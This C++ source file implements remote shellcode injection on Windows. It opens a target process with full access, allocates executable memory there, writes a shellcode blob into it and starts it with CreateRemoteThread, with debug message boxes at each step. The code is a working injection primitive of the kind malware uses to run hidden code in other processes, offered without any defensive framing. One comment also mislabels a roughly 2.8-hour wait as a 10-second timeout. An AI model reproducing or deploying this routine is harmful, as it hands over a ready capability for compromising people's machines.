// ---------------------  inject_shellcode.cpp  ---------------------------
#include <Windows.h>
#include <vector>
#include "util.h"

bool inject_shellcode(DWORD pid,
    const std::vector<uint8_t>& blob,
    DWORD* pThreadExit)
{
    util::MsgBox(nullptr, "OpenProcess", "inject_shellcode", 0);
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        util::MsgBox(nullptr, "OpenProcess 失败", "inject_shellcode", 0);
        return false;
    }
    util::MsgBox(nullptr, "VirtualAllocEx(hProc", "inject_shellcode", 0);
    LPVOID remote = VirtualAllocEx(hProc, nullptr,
        blob.size(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    if (!remote) {
        CloseHandle(hProc);
        util::MsgBox(nullptr, "VirtualAllocEx 失败", "inject_shellcode", 0);
        return false;
    }

    SIZE_T wr;
    util::MsgBox(nullptr, "WriteProcessMemory", "inject_shellcode", 0);
    if (!WriteProcessMemory(hProc, remote, blob.data(), blob.size(), &wr) ||
        wr != blob.size())
    {
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        util::MsgBox(nullptr, "WriteProcessMemory 失败", "inject_shellcode", 0);
        return false;
    }
    util::MsgBox(nullptr, "CreateRemoteThread", "inject_shellcode", 0);
    DWORD  remoteTid = 0;          // will receive the ID
    HANDLE hThread = CreateRemoteThread(
        hProc,                         // target process handle
        nullptr,                       // security
        0,                             // default stack
        (LPTHREAD_START_ROUTINE)remote,// shellcode entry point
        nullptr,                       // parameter to entry-point
        0,                             // run immediately
        &remoteTid);                   // <-- give it an address!
    if (!hThread) {
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        util::MsgBox(nullptr, "CreateRemoteThread 失败", "inject_shellcode", 0);
        return false;
    }
    std::string msg = "Remote TID = " + std::to_string(remoteTid);
    util::MsgBox(nullptr, msg.c_str(), "inject_shellcode", 0);
    util::MsgBox(nullptr, "WaitForSingleObject", "inject_shellcode", 0);
    DWORD exitCode = 0;
    DWORD rc = WaitForSingleObject(hThread, 10'000'000);   // 10-sec timeout
    GetExitCodeThread(hThread, &exitCode);

    if (rc == WAIT_TIMEOUT)          printf("Thread still running\n");
    else                             printf("Exit code = 0x%08X\n", exitCode);

    if (pThreadExit) GetExitCodeThread(hThread, pThreadExit);

    CloseHandle(hThread);
    CloseHandle(hProc);
    util::MsgBox(nullptr, "returned", "inject_shellcode", 0);
    return true;
}
